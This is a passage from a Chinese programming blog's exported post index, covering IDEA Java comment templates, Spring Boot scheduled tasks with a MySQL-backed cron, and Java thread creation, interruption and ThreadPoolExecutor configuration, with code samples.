线程启动原理\n线程中断机制\n多线程实现方式\nFutureTask实现原理\n线程池之ThreadPoolExecutor概述\n线程池之ThreadPoolExecutor使用\n线程池之ThreadPoolExecutor状态控制\n线程池之ThreadPoolExecutor执行原理\n线程池之ScheduledThreadPoolExecutor概述\n线程池之ScheduledThreadPoolExecutor调度原理\n线程池的优雅关闭实践\n作者：徐志毅 链接：https://www.jianshu.com/p/bdf06e2c1541 来源：简书 著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。\n","permalink":"http://bingerambo.com/posts/2021/12/%E8%BD%AC%E8%BD%BDjava%E7%BA%BF%E7%A8%8B%E6%B1%A0%E5%85%B3%E9%97%AD/","tags":["Java"],"title":"[转载]Java线程池关闭"},{"categories":["软件"],"contents":"Idea设置Java类注释模板和方法注释模板 设置类注释模板 1）：选择File–\u0026gt;Settings–\u0026gt;Editor–\u0026gt;File and Code Templates–\u0026gt;Includes–\u0026gt;File Header.\n并勾选enable live template\n注释模板：\n1 2 3 4 5 6 7 8  /** * @Title: ${file_name} * @Package ${package_name} * @Description: ${todo} * @author: runoob * @date: ${date} ${time} * @version: V1.0 */   或自定义\n1 2 3 4 5 6  /** * @Description: ${todo} * @author: ${USER} * @date: ${DATE} ${TIME} * @version: V1.0 */   设置方法注释模板 Idea没有可以直接设置方法注释模板的地方，可以借用Live Templates基本实现，步骤如下。\n1）：选择File–\u0026gt;Settings–\u0026gt;Editor–\u0026gt;Live Templates，先选择右侧加号新建一个自己的模板组，如图 我这里命名模板组名为myGroup。\n2）：选中组，选择右侧加号新建模板\n这里注释快捷键可以自定义，如：cmj\n3）：方法注释模板：\n1 2 3 4 5 6 7 8 9  /** * @Title: $enclosing_method$ * @Description: $todo$ * @param: $param$ * @return: $return$ * @author: binge * @date: $date$ $time$ * @throws */   4）：点击Define，勾选Java\n5）：点击Edit variables编辑变量，设置如下，点击Ok–\u0026gt;Apply完成设置。\n说明：实际上为$var_name$变量配置相应的Expression操作，如methodName()、date()等，用于生成指定注释内容\n6）：输入“/**”或者自定义快捷键，如cmj，然后按Tab键即可生成注释。live这种方式是需要在方法内部生成，否则@param等一些参数会是null。不像eclipse 方法头部就可以。\n自定义方法注释模板 template text 1 2 3 4 5 6 7 8  /** * @titile: $enclosing_method$ * @description: $todo$ $params$ * @return: $return$ * @author: dragon * @date: $date$ $time$ */   params 去掉params带中括号\n1 2 3 4 5  groovyScript(\u0026#34;def result=\u0026#39;\u0026#39;; def params=\\\u0026#34;${_1}\\\u0026#34;.replaceAll(\u0026#39;[\\\\\\\\[|\\\\\\\\]|\\\\\\\\s]\u0026#39;, \u0026#39;\u0026#39;).split(\u0026#39;,\u0026#39;).toList(); for(i = 0; i \u0026lt; params.size(); i++) {result+=\u0026#39; * @param \u0026#39; + params[i] + ((i \u0026lt; params.size() - 1) ? \u0026#39;\\\\n\u0026#39;:\u0026#39;\u0026#39;)}; return result\u0026#34;, methodParameters())   retrun 去掉retrun全类名\n1 2 3 4 5 6 7 8 9 10 11  groovyScript(\u0026#34;def result=\u0026#39;\u0026#39;; def params=\\\u0026#34;${_1}\\\u0026#34;.replaceAll(\u0026#39;[\\\\\\\\[|\\\\\\\\]|\\\\\\\\s]\u0026#39;, \u0026#39;\u0026#39;).split(\u0026#39;\u0026lt;\u0026#39;).toList(); for(i = 0; i \u0026lt; params.size(); i++) {if(i!=0){result+=\u0026#39;\u0026lt;\u0026#39;;}; def p1=params[i].split(\u0026#39;,\u0026#39;).toList(); for(i2 = 0; i2 \u0026lt; p1.size(); i2++) { def p2=p1[i2].split(\u0026#39;\\\\\\\\.\u0026#39;).toList(); result+=p2[p2.size()-1]; if(i2!=p1.size()-1){result+=\u0026#39;,\u0026#39;} } ; }; return result\u0026#34;, methodReturnType())   ","permalink":"http://bingerambo.com/posts/2021/11/idea%E8%AE%BE%E7%BD%AEjava%E6%B3%A8%E9%87%8A%E6%A8%A1%E6%9D%BF/","tags":["软件"],"title":" IDEA设置Java注释模板"},{"categories":["Java"],"contents":"Springboot 定时任务 序言 使用SpringBoot创建定时任务非常简单，目前主要有以下三种创建方式：\n 一、基于注解(@Scheduled) 二、基于接口（SchedulingConfigurer） 前者相信大家都很熟悉，但是实际使用中我们往往想从数据库中读取指定时间来动态执行定时任务，这时候基于接口的定时任务就派上用场了。 三、基于注解设定多线程定时任务  一、静态：基于注解 基于注解@Scheduled默认为单线程，开启多个任务时，任务的执行时机会受上一个任务执行时间的影响。\n1、创建定时器 使用SpringBoot基于注解来创建定时任务非常简单，只需几行代码便可完成。 代码如下：\n1 2 3 4 5 6 7 8 9 10 11  @Configuration //1.主要用于标记配置类，兼备Component的效果。 @EnableScheduling // 2.开启定时任务 public class SaticScheduleTask { //3.添加定时任务  @Scheduled(cron = \u0026#34;0/5 * * * * ?\u0026#34;) //或直接指定时间间隔，例如：5秒  //@Scheduled(fixedRate=5000)  private void configureTasks() { System.err.println(\u0026#34;执行静态定时任务时间: \u0026#34; + LocalDateTime.now()); } }   Cron表达式参数分别表示：\n 秒（0~59） 例如0/5表示每5秒 分（0~59） 时（0~23） 日（0~31）的某天，需计算 月（0~11） 周几（ 可填1-7 或 SUN/MON/TUE/WED/THU/FRI/SAT）  @Scheduled：除了支持灵活的参数表达式cron之外，还支持简单的延时操作，例如 fixedDelay ，fixedRate 填写相应的毫秒数即可。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  // Cron表达式范例： 每隔5秒执行一次：*/5 * * * * ? 每隔1分钟执行一次：0 */1 * * * ? 每天23点执行一次：0 0 23 * * ? 每天凌晨1点执行一次：0 0 1 * * ? 每月1号凌晨1点执行一次：0 0 1 1 * ? 每月最后一天23点执行一次：0 0 23 L * ? 每周星期天凌晨1点实行一次：0 0 1 ? * L 在26分、29分、33分执行一次：0 26,29,33 * * * ? 每天的0点、13点、18点、21点都执行一次：0 0 0,13,18,21 * * ?   显然，使用@Scheduled 注解很方便，但缺点是当我们调整了执行周期的时候，需要重启应用才能生效，这多少有些不方便。为了达到实时生效的效果，可以使用接口来完成定时任务。\n二、动态：基于接口 基于接口（SchedulingConfigurer）\n1、导入依赖包： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27  \u0026lt;parent\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.0.4.RELEASE\u0026lt;/version\u0026gt; \u0026lt;/parent\u0026gt; \u0026lt;dependencies\u0026gt; \u0026lt;dependency\u0026gt;\u0026lt;!--添加Web依赖 --\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-web\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt;\u0026lt;!--添加MySql依赖 --\u0026gt; \u0026lt;groupId\u0026gt;mysql\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;mysql-connector-java\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt;\u0026lt;!--添加Mybatis依赖 配置mybatis的一些初始化的东西--\u0026gt; \u0026lt;groupId\u0026gt;org.mybatis.spring.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;mybatis-spring-boot-starter\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.3.1\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt;\u0026lt;!-- 添加mybatis依赖 --\u0026gt; \u0026lt;groupId\u0026gt;org.mybatis\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;mybatis\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.4.5\u0026lt;/version\u0026gt; \u0026lt;scope\u0026gt;compile\u0026lt;/scope\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;/dependencies\u0026gt;   2、添加数据库记录： 开启本地数据库mysql，随便打开查询窗口，然后执行脚本内容，如下：\n1 2 3 4 5 6 7 8 9  DROP DATABASE IF EXISTS `socks`; CREATE DATABASE `socks`; USE `SOCKS`; DROP TABLE IF EXISTS `cron`; CREATE TABLE `cron` ( `cron_id` varchar(30) NOT NULL PRIMARY KEY, `cron` varchar(30) NOT NULL ); INSERT INTO `cron` VALUES (\u0026#39;1\u0026#39;, \u0026#39;0/5 * * * * ?\u0026#39;);   然后在项目中的application.yml 添加数据源：\n1 2 3 4 5  spring:datasource:url:jdbc:mysql://localhost:3306/socksusername:rootpassword:123456  3、创建定时器 数据库准备好数据之后，我们编写定时任务，注意这里添加的是TriggerTask，目的是循环读取我们在数据库设置好的执行周期，以及执行相关定时任务的内容。 具体代码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38  @Configuration //1.主要用于标记配置类，兼备Component的效果。 @EnableScheduling // 2.开启定时任务 public class DynamicScheduleTask implements SchedulingConfigurer { @Mapper public interface CronMapper { @Select(\u0026#34;select cron from cron limit 1\u0026#34;) public String getCron(); } @Autowired //注入mapper  @SuppressWarnings(\u0026#34;all\u0026#34;) CronMapper cronMapper; /** * 执行定时任务. */ @Override public void configureTasks(ScheduledTaskRegistrar taskRegistrar) { taskRegistrar.addTriggerTask( //1.添加任务内容(Runnable)  () -\u0026gt; System.out.println(\u0026#34;执行动态定时任务: \u0026#34; + LocalDateTime.now().toLocalTime()), //2.设置执行周期(Trigger)  triggerContext -\u0026gt; { //2.1 从数据库获取执行周期  String cron = cronMapper.getCron(); //2.2 合法性校验.  if (StringUtils.isEmpty(cron)) { // Omitted Code ..  } //2.3 返回执行周期(Date)  return new CronTrigger(cron).nextExecutionTime(triggerContext); } ); } }   4、启动测试 启动应用后，查看控制台，打印时间是我们预期的每10秒一次：\n然后打开Navicat ，将执行周期修改为每6秒执行一次，\n查看控制台，发现执行周期已经改变，并且不需要我们重启应用，十分方便\n注意： 如果在数据库修改时格式出现错误，则定时任务会停止，即使重新修改正确；此时只能重新启动项目才能恢复。\n三、多线程定时任务 基于注解设定多线程定时任务\n1、创建多线程定时任务 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  //@Component注解用于对那些比较中立的类进行注释； //相对与在持久层、业务层和控制层分别采用 @Repository、@Service 和 @Controller 对分层中的类进行注释 @Component @EnableScheduling // 1.开启定时任务 @EnableAsync // 2.开启多线程 public class MultithreadScheduleTask { @Async @Scheduled(fixedDelay = 1000) //间隔1秒  public void first() throws InterruptedException { System.out.println(\u0026#34;第一个定时任务开始 : \u0026#34; + LocalDateTime.now().toLocalTime() + \u0026#34;\\r\\n线程 : \u0026#34; + Thread.currentThread().getName()); System.out.println(); Thread.sleep(1000 * 10); } @Async @Scheduled(fixedDelay = 2000) public void second() { System.out.println(\u0026#34;第二个定时任务开始 : \u0026#34; + LocalDateTime.now().toLocalTime() + \u0026#34;\\r\\n线程 : \u0026#34; + Thread.currentThread().getName()); System.out.println(); } }   注： 这里的@Async注解很关键\n2、启动测试 启动应用后，查看控制台：\n从控制台可以看出，第一个定时任务和第二个定时任务互不影响；\n并且，由于开启了多线程，第一个任务的执行时间也不受其本身执行时间的限制，所以需要注意可能会出现重复操作导致数据异常。\n代码地址：\nhttps://github.com/mmzsblog/springboot-schedule\n原文链接：\nhttps://www.mmzsblog.cn/articles/2019/08/08/1565247960802.html\n附录 玩转SpringBoot之定时任务详解\n","permalink":"http://bingerambo.com/posts/2021/11/springboot-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/","tags":["Java"],"title":"Springboot 定时任务"},{"categories":["Java"],"contents":"java多线程实现 java多线程本质上是实现Runnable接口\n我们都知道启动一个线程，必须调用一个Thread的start()方法。在面试时经常可能会被问到start()和run()方法的区别，为什么一定要用start()方法才是启动线程？对比start()方法和run()的源码一看便知：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69  /** * Causes this thread to begin execution; the Java Virtual Machine * calls the \u0026lt;code\u0026gt;run\u0026lt;/code\u0026gt; method of this thread. * * 1、start方法将导致this thread开始执行。由JVM调用this thread的run方法。 * * The result is that two threads are running concurrently: the * current thread (which returns from the call to the * \u0026lt;code\u0026gt;start\u0026lt;/code\u0026gt; method) and the other thread (which executes its * \u0026lt;code\u0026gt;run\u0026lt;/code\u0026gt; method). * * 2、结果是 调用start方法的当前线程 和 执行run方法的另一个线程 并发运行。 * * It is never legal to start a thread more than once. * In particular, a thread may not be restarted once it has completed * execution. * * 3、多次启动线程永远不合法。 特别是，线程一旦完成执行就不会重新启动。 * * @exception IllegalThreadStateException if the thread was already started. * 如果线程已启动，则抛出异常。 * @see #run() * @see #stop() */ public synchronized void start() { /** * This method is not invoked for the main method thread or \u0026#34;system\u0026#34; * group threads created/set up by the VM. Any new functionality added * to this method in the future may have to also be added to the VM. * * 4、对于由VM创建/设置的main方法线程或“system”组线程，不会调用此方法。 * 未来添加到此方法的任何新功能可能也必须添加到VM中。 * * A zero status value corresponds to state \u0026#34;NEW\u0026#34;. * 5、status=0 代表是 status 是 \u0026#34;NEW\u0026#34;。 */ if (threadStatus != 0) throw new IllegalThreadStateException(); /* Notify the group that this thread is about to be started * so that it can be added to the group\u0026#39;s list of threads * and the group\u0026#39;s unstarted count can be decremented. * * 6、通知组该线程即将启动，以便将其添加到线程组的列表中， * 并且减少线程组的未启动线程数递减。 * * */ group.add(this); boolean started = false; try { //7、调用native方法，底层开启异步线程，并调用run方法。  start0(); started = true; } finally { try { if (!started) { group.threadStartFailed(this); } } catch (Throwable ignore) { /* do nothing. If start0 threw a Throwable then it will be passed up the call stack * 8、忽略异常。 如果start0抛出一个Throwable，它将被传递给调用堆栈。 */ } } } //native方法，JVM创建并启动线程，并调用run方法  private native void start0();   对于源码中的注释并没有省略，都进行了翻译，可以更好的理解整个启动过程。其中有几个需要注意的点：\n  start方法用synchronized修饰，为同步方法； 虽然为同步方法，但不能避免多次调用问题，用threadStatus来记录线程状态，如果线程被多次start会抛出异常；threadStatus的状态由JVM控制。 使用Runnable时，主线程无法捕获子线程中的异常状态。线程的异常，应在线程内部解决。   0、线程中断机制(interrupt) 优雅的中断线程，是一门艺术\n众所周知，Thread.stop, Thread.suspend, Thread.resume 都已经被废弃了。因为它们太暴力了，是不安全的，这种暴力中断线程是一种不安全的操作，举个栗子来说明其可能造成的问题：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51  public class ThreadTest { public static void main(String[] args) { StopThread stopThread = new StopThread(); // 启动线程  stopThread.start(); try { // 休眠1秒，确保线程进入运行  Thread.sleep(1000); } catch (InterruptedException e) { e.printStackTrace(); } // 暂停线程  stopThread.stop(); // stopThread.interrupt();  // 确保线程已经销毁  while (stopThread.isAlive()) { } // 输出结果  stopThread.print(); } private static class StopThread extends Thread { private int x = 0; private int y = 0; @Override public void run(){ // 这是一个同步原子操作  synchronized (this){ ++x; try { // 休眠3秒,模拟耗时操作  Thread.sleep(3000); }catch (Exception e){ e.printStackTrace(); } ++y; } } public void print() { System.out.println(\u0026#34;x=\u0026#34; + x + \u0026#34; y=\u0026#34; + y); } } }   上述代码中，run方法里是一个同步的原子操作，x和y必须要共同增加，然而这里如果调用thread.stop()方法强制中断线程，输出如下：\n1  x=1 y=0   没有异常，也破坏了我们的预期。如果这种问题出现在我们的程序中，会引发难以预期的异常。因此这种不安全的方式很早就被废弃了。取而代之的是interrupt()，上述代码如果采用thread.interrupt()方法，输出结果如下：\n1 2 3 4  java.lang.InterruptedException: sleep interrupted at java.lang.Thread.sleep(Native Method) at ThreadTest$StopThread.run(ThreadTest.java:35) x=1 y=1   x=1,y=1 这个结果是符合我们的预期，同时还抛出了个异常，这个异常下文详说。\ninterrupt() 它基于「一个线程不应该由其他线程来强制中断或停止，而是应该由线程自己自行停止。」思想，是一个比较温柔的做法，它更类似一个标志位。其实作用不是中断线程，而是「通知线程应该中断了」，具体到底中断还是继续运行，应该由被通知的线程自己处理。\ninterrupt() 并不能真正的中断线程，这点要谨记。需要被调用的线程自己进行配合才行。也就是说，一个线程如果有被中断的需求，那么就需要这样做：\n 在正常运行任务时，经常检查本线程的中断标志位，如果被设置了中断标志就自行停止线程。 在调用阻塞方法时正确处理InterruptedException异常。（例如：catch异常后就结束线程。）  先看下 Thread 类 interrupt 相关的几个方法：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25  // 核心 interrupt 方法  public void interrupt() { if (this != Thread.currentThread()) // 非本线程，需要检查权限  checkAccess(); synchronized (blockerLock) { Interruptible b = blocker; if (b != null) { interrupt0(); // 仅仅设置interrupt标志位  b.interrupt(this); // 调用如 I/O 操作定义的中断方法  return; } } interrupt0(); } // 静态方法，这个方法有点坑，调用该方法调用后会清除中断状态。  public static boolean interrupted() { return currentThread().isInterrupted(true); } // 这个方法不会清除中断状态  public boolean isInterrupted() { return isInterrupted(false); } // 上面两个方法会调用这个本地方法，参数代表是否清除中断状态  private native boolean isInterrupted(boolean ClearInterrupted);   首先讲 interrupt() 方法：\n interrupt 中断操作时，非自身打断需要先检测是否有中断权限，这由jvm的安全机制配置； 如果线程处于sleep, wait, join 等状态，那么线程将立即退出被阻塞状态，并抛出一个InterruptedException异常； 如果线程处于I/O阻塞状态，将会抛出ClosedByInterruptException（IOException的子类）异常； 如果线程在Selector上被阻塞，select方法将立即返回； 如果非以上情况，将直接标记 interrupt 状态；  注意：interrupt 操作不会打断所有阻塞，只有上述阻塞情况才在jvm的打断范围内，如处于锁阻塞的线程，不会受 interrupt 中断；\n阻塞情况下中断，抛出异常后线程恢复非中断状态，即 interrupted = false\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27  public class ThreadTest { public static void main(String[] args) throws InterruptedException { Thread t = new Thread(new Task(\u0026#34;1\u0026#34;)); t.start(); t.interrupt(); } static class Task implements Runnable{ String name; public Task(String name) { this.name = name; } @Override public void run() { try { Thread.sleep(1000); } catch (InterruptedException e) { System.out.println(\u0026#34;thread has been interrupt!\u0026#34;); } System.out.println(\u0026#34;isInterrupted: \u0026#34; + Thread.currentThread().isInterrupted()); System.out.println(\u0026#34;task \u0026#34; + name + \u0026#34; is over\u0026#34;); } } }   输出：\n1 2 3  thread has been interrupt! isInterrupted: false task 1 is over   调用Thread.interrupted() 方法后线程恢复非中断状态\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  public class ThreadTest { public static void main(String[] args) throws InterruptedException { Thread t = new Thread(new Task(\u0026#34;1\u0026#34;)); t.start(); t.interrupt(); } static class Task implements Runnable{ String name; public Task(String name) { this.name = name; } @Override public void run() { System.out.println(\u0026#34;first :\u0026#34; + Thread.interrupted()); System.out.println(\u0026#34;second:\u0026#34; + Thread.interrupted()); System.out.println(\u0026#34;task \u0026#34; + name + \u0026#34; is over\u0026#34;); } } }   输出结果：\n1 2 3  first :true second:false task 1 is over   上述两种隐含的状态恢复操作，是符合常理的，因为线程标记为中断后，用户没有真正中断线程，必然将其恢复为false。理论上Thread.interrupted()调用后，如果已中断，应该执行退出操作，不会重复调用。\n1、实现Runnable接口 1 2 3 4 5 6 7 8 9 10 11 12 13  public class DemoThreadTask implements Runnable{ @Override public void run() { // TODO Auto-generated method stub  } public static void main(String[] args) { DemoThreadTask task = new DemoThreadTask(); Thread t = new Thread(task); t.start(); ... } }   实现Runnable接口，利用Runnable实例构造Thread，是较常用且最本质实现。此构造方法相当于对Runnable实例进行一层包装，在线程t启动时，调用Thread的run方法从而间接调用target.run()：\n1 2 3 4 5 6 7 8 9 10 11  public class Thread implements Runnable { /* What will be run. */ private Runnable target; public void run() { if (target != null) { target.run(); } } ... }   2、继承Thread类 1 2 3 4 5 6 7 8 9 10 11 12 13  public class DemoThread extends Thread{ @Override //重写run方法  public void run() { // TODO Auto-generated method stub  } public static void main(String[] args) { DemoThread t = new DemoThread(); t.start(); ... } }   这种实现方式是显示的继承了Thread，但从类图中我们可以看到，Thread类本身就继承自Runnable，所以继承Thread的本质依然是实现Runnable接口定义的run方法。\n需要注意的是继承Thread方式，target对象为null，重写了run方法，导致方式1中的Thread原生的run方法失效，因此并不会调用到target.run()的逻辑，而是直接调用子类重写的run方法。\n因为java是单根继承，此方式一般不常用。\n3、实现Callable接口并通过FutureTask包装 先看demo：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  public class DemoCallable implements Callable\u0026lt;String\u0026gt;{ @Override public String call() throws Exception { // TODO Auto-generated method stub  return null; } public static void main(String[] args) throws Exception { DemoCallable c = new DemoCallable(); FutureTask\u0026lt;String\u0026gt; future = new FutureTask\u0026lt;\u0026gt;(c); Thread t = new Thread(future); t.start(); ... String result = future.get(); //同步获取返回结果  System.out.println(result); } }   实现Callable接口通过FutureTask包装，可以获取到线程的处理结果，future.get()方法获取返回值，如果线程还没执行完，则会阻塞。\n这个方法里，明明没有看到run方法，没有看到Runnable，为什么说本质也是实现Runnable接口呢？\n回看开篇的类图，FutureTask实现了RunnableFuture，RunnableFuture则实现了Runnable和Future两个接口。因此构造Thread时，FutureTask还是被转型为Runnable使用。因此其本质还是实现Runnable接口。\n至于FutureTask的工作原理，后续篇章继续分析。\n4、匿名内部类 匿名内部类也有多种变体，上述三种方式都可以使用匿名内部类来隐式实例化。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  public class Demo{ public static void main(String[] args) throws Exception { //方式一：Thread匿名内部类  new Thread(){ @Override public void run() { // TODO Auto-generated method stub  } }.start(); //方式二：Runnable匿名内部类  new Thread(new Runnable() { @Override public void run() { // TODO Auto-generated method stub  } }).start(); ... } }   匿名内部类的优点在于使用方便，不用额外定义类，缺点就是代码可读性差。\n5、Lambda表达式 Lambda表达式是jdk8引入的，已不是什么新东西，现在都jdk10了。demo如下：\n1 2 3 4 5 6  public class Demo{ public static void main(String[] args) throws Exception { new Thread(() -\u0026gt; System.out.println(\u0026#34;running\u0026#34;) ).start() ; ... } }   如此简洁的Lambda表达式，有没有吸引到你呢？当然本质不多说，还是基于Runnable接口。\n6、线程池 1 2 3 4 5 6 7 8 9 10 11 12 13 14  public class DemoThreadTask implements Runnable{ @Override public void run() { // TODO Auto-generated method stub  System.out.println(\u0026#34;running\u0026#34;); } public static void main(String[] args) { DemoThreadTask task = new DemoThreadTask(); ExecutorService ex = Executors.newCachedThreadPool(); ex.execute(task); ... } }   线程池与前面所述其他方式的区别在于执行线程的时候由ExecutorService去执行，最终还是利用Thread创建线程。线程池的优势在于线程的复用，从而提高效率。\n关于线程池，后续篇章会继续详解。\n7、定时器\n1 2 3 4 5 6 7 8 9 10 11 12  public class DemoTimmerTask { public static void main(String[] args) throws Exception { Timer timer = new Timer(); timer.scheduleAtFixedRate((new TimerTask() { @Override public void run() { System.out.println(\u0026#34;定时任务1执行了....\u0026#34;); } }), 2000, 1000); } }   TimerTask的实现了Runnable接口，Timer内部有个TimerThread继承自Thread，因此绕回来还是Thread + Runnable。\nThreadPoolExecutor概述 工作中经常涉及异步任务，通常是使用多线程技术，比如线程池ThreadPoolExecutor，它的执行规则如下：\nJava源码里面都有大量的注释，认真读懂这些注释，就可以把握其七分工作机制了。关于ThreadPoolExecutor的解析，我们就从其类注释开始。\n现将注释大致翻译如下：\nExecutorService（ThreadPoolExecutor的顶层接口）使用线程池中的线程执行每个提交的任务，通常我们使用Executors的工厂方法来创建ExecutorService。\n线程池解决了两个不同的问题：\n 提升性能：它们通常在执行大量异步任务时，由于减少了每个任务的调用开销，并且它们提供了一种限制和管理资源（包括线程）的方法，使得性能提升明显； 统计信息：每个ThreadPoolExecutor保持一些基本的统计信息，例如完成的任务数量。  为了在广泛的上下文中有用，此类提供了许多可调参数和可扩展性钩子。 但是，在常见场景中，我们预配置了几种线程池，我们敦促程序员使用更方便的Executors的工厂方法直接使用。\n Executors.newCachedThreadPool（无界线程池，自动线程回收） Executors.newFixedThreadPool（固定大小的线程池）； Executors.newSingleThreadExecutor（单一后台线程）；  1  注：这里没有提到ScheduledExecutorService ，后续解析。   在自定义线程池时，请参考以下指南：\n一、Core and maximum pool sizes 核心和最大线程池数量    参数 翻译     corePoolSize 核心线程池数量   maximumPoolSize 最大线程池数量    线程池执行器将会根据corePoolSize和maximumPoolSize自动地调整线程池大小。\n当在execute(Runnable)方法中提交新任务并且少于corePoolSize线程正在运行时，即使其他工作线程处于空闲状态，也会创建一个新线程来处理该请求。 如果有多于corePoolSize但小于maximumPoolSize线程正在运行，则仅当队列已满时才会创建新线程。 通过设置corePoolSize和maximumPoolSize相同，您可以创建一个固定大小的线程池。 通过将maximumPoolSize设置为基本上无界的值，例如Integer.MAX_VALUE，您可以允许池容纳任意数量的并发任务。 通常，核心和最大池大小仅在构建时设置，但也可以使用setCorePoolSize和setMaximumPoolSize进行动态更改。\n这段话详细了描述了线程池对任务的处理流程，这里用个图总结一下\n二、prestartCoreThread 核心线程预启动 在默认情况下，只有当新任务到达时，才开始创建和启动核心线程，但是我们可以使用 prestartCoreThread() 和 prestartAllCoreThreads() 方法动态调整。 如果使用非空队列构建池，则可能需要预先启动线程。\n   方法 作用     prestartCoreThread() 创一个空闲任务线程等待任务的到达   prestartAllCoreThreads() 创建核心线程池数量的空闲任务线程等待任务的到达    三、ThreadFactory 线程工厂 新线程使用ThreadFactory创建。 如果未另行指定，则使用Executors.defaultThreadFactory默认工厂，使其全部位于同一个ThreadGroup中，并且具有相同的NORM_PRIORITY优先级和非守护进程状态。\n通过提供不同的ThreadFactory，您可以更改线程的名称，线程组，优先级，守护进程状态等。如果ThreadCactory在通过从newThread返回null询问时未能创建线程，则执行程序将继续，但可能无法执行任何任务。\n线程应该有modifyThread权限。 如果工作线程或使用该池的其他线程不具备此权限，则服务可能会降级：配置更改可能无法及时生效，并且关闭池可能会保持可终止但尚未完成的状态。\n四、Keep-alive times 线程存活时间 如果线程池当前拥有超过corePoolSize的线程，那么多余的线程在空闲时间超过keepAliveTime时会被终止 ( 请参阅getKeepAliveTime(TimeUnit) )。这提供了一种在不积极使用线程池时减少资源消耗的方法。\n如果池在以后变得更加活跃，则应构建新线程。 也可以使用方法setKeepAliveTime(long，TimeUnit)进行动态调整。\n防止空闲线程在关闭之前终止，可以使用如下方法：\n setKeepAliveTime(Long.MAX_VALUE，TimeUnit.NANOSECONDS);\n 默认情况下，keep-alive策略仅适用于存在超过corePoolSize线程的情况。 但是，只要keepAliveTime值不为零，方法allowCoreThreadTimeOut(boolean)也可用于将此超时策略应用于核心线程。\n五、Queuing 队列 BlockingQueue用于存放提交的任务，队列的实际容量与线程池大小相关联。\n 如果当前线程池任务线程数量小于核心线程池数量，执行器总是优先创建一个任务线程，而不是从线程队列中取一个空闲线程。 如果当前线程池任务线程数量大于核心线程池数量，执行器总是优先从线程队列中取一个空闲线程，而不是创建一个任务线程。 如果当前线程池任务线程数量大于核心线程池数量，且队列中无空闲任务线程，将会创建一个任务线程，直到超出maximumPoolSize，如果超时maximumPoolSize，则任务将会被拒绝。  1  这个过程参考[线程任务处理流程图]   主要有三种队列策略：\n Direct handoffs 直接握手队列 Direct handoffs 的一个很好的默认选择是 SynchronousQueue，它将任务交给线程而不需要保留。这里，如果没有线程立即可用来运行它，那么排队任务的尝试将失败，因此将构建新的线程。 此策略在处理可能具有内部依赖关系的请求集时避免锁定。Direct handoffs 通常需要无限制的maximumPoolSizes来避免拒绝新提交的任务。 但得注意，当任务持续以平均提交速度大余平均处理速度时，会导致线程数量会无限增长问题。 Unbounded queues 无界队列 当所有corePoolSize线程繁忙时，使用无界队列（例如，没有预定义容量的LinkedBlockingQueue）将导致新任务在队列中等待，从而导致maximumPoolSize的值没有任何作用。当每个任务互不影响，完全独立于其他任务时，这可能是合适的; 例如，在网页服务器中， 这种队列方式可以用于平滑瞬时大量请求。但得注意，当任务持续以平均提交速度大余平均处理速度时，会导致队列无限增长问题。 Bounded queues 有界队列 一个有界的队列（例如，一个ArrayBlockingQueue）和有限的maximumPoolSizes配置有助于防止资源耗尽，但是难以控制。队列大小和maximumPoolSizes需要 相互权衡：   使用大队列和较小的maximumPoolSizes可以最大限度地减少CPU使用率，操作系统资源和上下文切换开销，但会导致人为的低吞吐量。如果任务经常被阻塞（比如I/O限制），那么系统可以调度比我们允许的更多的线程。 使用小队列通常需要较大的maximumPoolSizes，这会使CPU更繁忙，但可能会遇到不可接受的调度开销，这也会降低吞吐量。 这里主要为了说明有界队列大小和maximumPoolSizes的大小控制，若何降低资源消耗的同时，提高吞吐量  六、Rejected tasks 拒绝任务 拒绝任务有两种情况：1. 线程池已经被关闭；2. 任务队列已满且maximumPoolSizes已满； 无论哪种情况，都会调用RejectedExecutionHandler的rejectedExecution方法。预定义了四种处理策略：\n AbortPolicy：默认测策略，抛出RejectedExecutionException运行时异常； CallerRunsPolicy：这提供了一个简单的反馈控制机制，可以减慢提交新任务的速度； DiscardPolicy：直接丢弃新提交的任务； DiscardOldestPolicy：如果执行器没有关闭，队列头的任务将会被丢弃，然后执行器重新尝试执行任务（如果失败，则重复这一过程）； 我们可以自己定义RejectedExecutionHandler，以适应特殊的容量和队列策略场景中。  七、Hook 